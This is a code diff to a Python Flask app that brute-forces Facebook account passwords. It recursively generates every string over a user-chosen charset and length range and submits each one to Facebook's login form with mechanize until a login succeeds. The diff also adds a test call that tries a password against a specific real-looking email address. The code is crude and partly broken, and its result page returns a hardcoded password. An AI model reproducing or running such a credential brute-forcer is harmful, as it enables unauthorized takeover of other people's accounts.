@@ -28,20 +28,30 @@ def brute_force_alg():
     username = request.form['accusername']
     charset = request.form['charset']
     website = request.form['website']
-    if website == "Facebook":
-        password = length_parameter_check(username, minpasswordlength, charset, maxpasswordlength)
-    # elif website == "yahoo":
-        #password = length_parameter_check(username, passwordlength, charset)
-    return render_template('result.html', username = username, password = password)
-
-def length_parameter_check(username, minpasswordlength, charset, maxpasswordlength):
-        for x in range(1,int(minpasswordlength)+1):
-            for y in range(1,x+1):
-                print("test")
-        if(facebook_form_filler(username, "gobuckyes")):
-            return "gobuckeyes"
+    for x in range(int(minpasswordlength),int(maxpasswordlength)+1):
+        print(generate(username,charset,x,""))
+        #print("username = "+username+"password = "+password)
+        #if(facebook_form_filler(username, "gobuckeyes")):
+    return render_template('result.html', username = username, password = "gobuckeyes")
+    #return render_template('bruteforce.html')
+def generate(username, charset, length, word):
+    if length==0:
+        print(word)
+        if facebook_form_filler(username, word):
+            print("found it")
+            return word
         else:
-            return "fuck"
+            return None
+        #print(word)
+    for i in range(len(charset)):
+        appended = word + charset[i]
+        #print(appended)
+        newword = generate(username, charset, length-1,appended)
+        if newword != None:
+            return newword
+    return None
+
+
 def facebook_form_filler(email, password):
     br = mechanize.Browser()
     #br.set_all_readonly(False)    # allow everything to be written to
@@ -62,3 +72,5 @@ def facebook_form_filler(email, password):
     br.form['pass'] = password
     result = br.submit(id='u_0_2')
     return result.geturl() == "https://www.facebook.com/"
+
+print(facebook_form_filler("tarabite@yahoo.com","ggggggoo"))
